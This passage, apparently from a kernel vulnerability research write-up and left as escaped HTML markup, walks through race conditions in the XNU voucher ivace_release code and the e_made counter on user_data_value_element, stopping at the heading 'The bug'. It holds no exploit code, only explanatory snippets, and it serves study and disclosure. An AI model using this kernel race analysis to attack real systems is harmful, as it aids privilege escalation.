hasn&amp;#39;t yet been removed by this thread from the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivac&lt;/span&gt;&lt;span&gt;&amp;#39;s hash table, and even though it&amp;#39;s been marked as being released by setting &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace_releasing&lt;/span&gt;&lt;span&gt;&amp;nbsp;to &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;TRUE&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;, that doesn&amp;#39;t prevent another reference being handed out on a racing thread.)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;There are then two distinct sub-cases:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;1) &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;(ivace-&amp;gt;ivace_made != made)&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c19 BGLtzooHlW-c11&quot;&gt;(KERN_SUCCESS == kr)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;We can now parse the meaning of this: this &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace&lt;/span&gt;&lt;span&gt;&amp;nbsp;was revived but that occurred after the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;user_data_value_element&lt;/span&gt;&lt;span&gt;&amp;nbsp;was freed on this thread. The racing thread then allocated a *new* value which happened to be exactly the same as the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace_value&lt;/span&gt;&lt;span&gt;&amp;nbsp;this &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace&lt;/span&gt;&lt;span&gt;&amp;nbsp;has, hence the other thread getting a reference on this &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace&lt;/span&gt;&lt;span&gt;&amp;nbsp;before this thread was able to remove it from the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivac&lt;/span&gt;&lt;span&gt;&amp;#39;s hash table. Note that for the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;user_data&lt;/span&gt;&lt;span&gt;&amp;nbsp;case the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace_value&lt;/span&gt;&lt;span&gt;&amp;nbsp;is a pointer (making this particular case even more unlikely, but not impossible) but it isn&amp;#39;t going to always be the case that the value is a pointer; at the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivac&lt;/span&gt;&lt;span&gt;&amp;nbsp;layer the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace_value&lt;/span&gt;&lt;span&gt;&amp;nbsp;is actually a 64-bit &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c14&quot;&gt;handle&lt;/span&gt;&lt;span&gt;. The &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;user_data&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;attr chooses to store a pointer there.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;So what&amp;#39;s happened in this case is that another thread has looked up an &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace&lt;/span&gt;&lt;span&gt;&amp;nbsp;for a new &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace_value&lt;/span&gt;&lt;span&gt;&amp;nbsp;which happens to &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c14&quot;&gt;collide&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;(due to having a matching pointer, but potentially different buffer contents) with the value that this thread had. I don&amp;#39;t think this actually has security implications; but it does take a while to get your head around.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;If this is the case then we&amp;#39;ve ended up with a pointer to a revived ivace which now, despite having a matching &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace_value&lt;/span&gt;&lt;span&gt;, is never-the-less semantically different from the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace&lt;/span&gt;&lt;span&gt;&amp;nbsp;we had when this thread entered this function. The connection between our thread&amp;#39;s idea of &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;and the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace_value&lt;/span&gt;&lt;span&gt;&amp;#39;s &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;e_made&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;has been severed; and we need to remove our thread&amp;#39;s contribution to that; hence:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=&quot;t.1577686d6e27cb6539edf4c668c25d37d0e6652c&quot;&gt;&lt;/a&gt;&lt;a id=&quot;t.50&quot;&gt;&lt;/a&gt;&lt;table class=&quot;BGLtzooHlW-c12&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;BGLtzooHlW-c1&quot;&gt;&lt;td class=&quot;BGLtzooHlW-c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace_made &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;made&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;KERN_SUCCESS &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;kr&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace_made &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;made&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;2) &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;(ivace-&amp;gt;ivace_made != made)&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;(0 == ivace-&amp;gt;ivace_refs)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;In this case another thread (or threads) has raced, revived this ivace and then deallocated all their references. Since this thread set &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace_releasing&lt;/span&gt;&lt;span&gt;&amp;nbsp;to &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;TRUE&lt;/span&gt;&lt;span&gt;&amp;nbsp;the racing thread, after decrementing &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace_refs&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;back to zero encountered this:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=&quot;t.26d470c1ed36965b7017da35a088eb61bd6b63c5&quot;&gt;&lt;/a&gt;&lt;a id=&quot;t.51&quot;&gt;&lt;/a&gt;&lt;table class=&quot;BGLtzooHlW-c12&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;BGLtzooHlW-c1&quot;&gt;&lt;td class=&quot;BGLtzooHlW-c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace_releasing&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_unlock&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivac&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;and returned early from &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace_release&lt;/span&gt;&lt;span&gt;, despite having dropped &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace_refs&lt;/span&gt;&lt;span&gt;&amp;nbsp;to zero, and it&amp;#39;s now this thread&amp;#39;s responsibility to continue freeing this &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=&quot;t.695f8a6ea5856759df1540506f4e25734c86a633&quot;&gt;&lt;/a&gt;&lt;a id=&quot;t.52&quot;&gt;&lt;/a&gt;&lt;table class=&quot;BGLtzooHlW-c12&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;BGLtzooHlW-c1&quot;&gt;&lt;td class=&quot;BGLtzooHlW-c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c15&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;ivace&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace_refs&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;goto&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;redrive&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;You can see the location of the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;redrive&lt;/span&gt;&lt;span&gt;&amp;nbsp;label in the earlier snippets; it captures a new value from &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;before calling out to the attr manager again to try to free the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace_value&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;If we don&amp;#39;t &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;goto redrive&lt;/span&gt;&lt;span&gt;&amp;nbsp;then this &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace&lt;/span&gt;&lt;span&gt;&amp;nbsp;has been revived and is still alive, therefore all that needs to be done is set &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace_releasing&lt;/span&gt;&lt;span&gt;&amp;nbsp;to &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;FALSE&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;and return.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;The conditions under which the other branch is taken is nicely documented in a comment. This is the case when &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;is equal to &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;made&lt;/span&gt;&lt;span&gt;, yet &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivam_release_value&lt;/span&gt;&lt;span&gt;&amp;nbsp;didn&amp;#39;t return success (so the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace_value&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;wasn&amp;#39;t freed.)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=&quot;t.5eb97c3d310b04e72ad54169750ec70dff549ca6&quot;&gt;&lt;/a&gt;&lt;a id=&quot;t.53&quot;&gt;&lt;/a&gt;&lt;table class=&quot;BGLtzooHlW-c12&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;BGLtzooHlW-c1&quot;&gt;&lt;td class=&quot;BGLtzooHlW-c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;/*&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* If the manager returned FAILURE, someone took a&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* reference on the value but have not updated the ivace,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* release the lock and return since thread who got&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* the new reference will update the ivace and will have&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* non-zero reference on the value.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;*/&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;In this case, the code again just sets &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace_releasing&lt;/span&gt;&lt;span&gt;&amp;nbsp;to &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;FALSE&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;and continues.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;Put another way, this comment explaining is exactly what happens when the racing thread was exactly in the region marked &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c23&quot;&gt;WINDOW&lt;/span&gt;&lt;span&gt;&amp;nbsp;up above, which is after that thread had incremented &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;on the same &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;user_data_value_element&lt;/span&gt;&lt;span&gt;&amp;nbsp;which this &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace&lt;/span&gt;&lt;span&gt;&amp;nbsp;has a pointer to in its &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace_value&lt;/span&gt;&lt;span&gt;&amp;nbsp;field, but before that thread had looked up this &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace&lt;/span&gt;&lt;span&gt;&amp;nbsp;and taken a reference. That&amp;#39;s exactly the window another thread needs to hit where it&amp;#39;s not correct for this thread to free its &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;user_data_value_element&lt;/span&gt;&lt;span&gt;, despite our &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace_refs&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;being 0.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=&quot;BGLtzooHlW-c18 BGLtzooHlW-c5&quot; id=&quot;h.9t2rft5xjjjf&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c20&quot;&gt;The bug&lt;/span&gt;&lt;/h2&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;Hopefully the significance of the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;user_data_value_element&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;e_made&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;field is now clear. It&amp;#39;s not exactly a reference count; in fact it only exists as a kind of band-aid to work around what should be in practice a very rare race condition. But, if its value was wrong, bad things could happen if you tried :)&lt;/span&gt;&lt;/p&gt;
